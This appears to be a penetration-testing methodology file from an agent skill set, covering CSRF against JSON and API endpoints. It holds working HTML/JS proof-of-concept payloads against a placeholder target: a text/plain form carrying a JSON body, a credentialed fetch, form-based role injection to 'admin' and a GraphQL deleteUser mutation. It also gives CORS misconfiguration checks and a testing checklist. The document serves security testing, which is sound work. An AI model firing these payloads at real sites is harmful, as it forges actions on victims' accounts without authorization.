# JSON/API CSRF

## CRITICAL: How to Use This File

**This file provides methodology for testing CSRF on JSON and API endpoints.**
**Phase context:** This is a sub-file of Phase 2 (Confirmation) in SKILL.md.

**Before using this file:**
1. Identify that endpoint expects JSON or is an API
2. Check what Content-Type is expected
3. Understand CORS configuration

**Stop Conditions:**
- Endpoint requires non-simple headers (preflight blocked) → Check CORS
- Strict Content-Type enforcement → Limited options
- Auth via non-cookie method (API key, Bearer token) → Not CSRF vulnerable

---

## Understanding JSON CSRF

### Why JSON Seems Safe

**Common misconception:** "JSON APIs are CSRF-safe because browsers can't send JSON cross-origin."

**Reality:**
- Browsers CAN send JSON cross-origin
- Preflight only triggers for certain Content-Types
- Many servers are lenient about Content-Type

### Key Concepts

**Simple vs Preflighted Requests:**

| Content-Type | Preflight? |
|--------------|------------|
| `application/x-www-form-urlencoded` | No |
| `multipart/form-data` | No |
| `text/plain` | No |
| `application/json` | YES |

If preflight is triggered and CORS doesn't allow the origin, request is blocked.

---

## Attack Techniques

### 1. Content-Type Flexibility

**Theory:** Server may accept non-JSON Content-Types but parse as JSON.

**Test:**
1. Change Content-Type to `text/plain`
2. Keep JSON body
3. Check if server still processes it

**PoC (text/plain):**
```html
<form action="https://target.com/api/action" method="POST" enctype="text/plain">
  <input name='{"param":"value","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

**Result in body:** `{"param":"value","ignore":"="}`

---

### 2. Form-Encoded to JSON Parser

**Theory:** Some servers accept form data and convert to JSON.

**Test:**
1. Send `application/x-www-form-urlencoded`
2. With parameters that map to JSON structure
3. Check if server processes as JSON

**PoC:**
```html
<form action="https://target.com/api/action" method="POST">
  <input name="param" value="value">
</form>
<script>document.forms[0].submit();</script>
```

---

### 3. Fetch API with Credentials

**Theory:** If CORS allows, fetch can send JSON with cookies.

**Prerequisite:** CORS misconfiguration (see below)

**PoC:**
```html
<script>
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({param: 'value'})
});
</script>
```

**Only works if:**
- `Access-Control-Allow-Origin` includes attacker origin (or *)
- `Access-Control-Allow-Credentials: true`

---

### 4. CORS Misconfiguration

**Check for these flaws:**

| Misconfiguration | How to Detect |
|------------------|---------------|
| Wildcard with credentials | `Access-Control-Allow-Origin: *` + cookies |
| Origin reflection | Origin header value reflected back |
| Null origin allowed | `Access-Control-Allow-Origin: null` |
| Subdomain allowed | `*.target.com` includes attacker subdomain |

**Test:**
1. Send request with `Origin: https://attacker.com`
2. Check response headers for `Access-Control-Allow-Origin`

---

### 5. Array/Object Injection via Form

**Theory:** Create JSON arrays/objects via form encoding tricks.

**Technique:**
```html
<form action="https://target.com/api" method="POST">
  <input name="users[0][name]" value="attacker">
  <input name="users[0][role]" value="admin">
</form>
```

Some parsers convert to: `{"users": [{"name": "attacker", "role": "admin"}]}`

---

### 6. GraphQL CSRF

**GraphQL-specific considerations:**

**If using GET:**
```html
<img src="https://target.com/graphql?query=mutation{...}">
```

**If using POST with form-encoded:**
```html
<form action="https://target.com/graphql" method="POST">
  <input name="query" value="mutation { deleteUser(id: 1) }">
</form>
```

---

## When JSON CSRF Is NOT Possible

**Endpoint is protected if:**
- Strict Content-Type application/json ONLY
- CORS properly configured (no attacker origins)
- Custom header required (`X-Requested-With`, `Authorization`)
- Non-cookie authentication (API keys, Bearer tokens)

---

## Testing Checklist

```
JSON/API CSRF Testing:
- [ ] Check accepted Content-Types
- [ ] Test text/plain with JSON body
- [ ] Test form-encoded submission
- [ ] Check CORS headers
- [ ] Test Origin header reflection
- [ ] Check for custom header requirements
- [ ] Verify authentication method (cookie vs token)
- [ ] Test GraphQL endpoints if present
```

---

## Return to Main Workflow

After completing JSON/API CSRF testing:
1. If bypass found → Return to SKILL.md Phase 4 (Exploitation) for PoC generation
2. If CORS misconfiguration found → Report separately in addition to CSRF
3. If all tests failed → Return to SKILL.md Phase 3 (Negative Verdict)
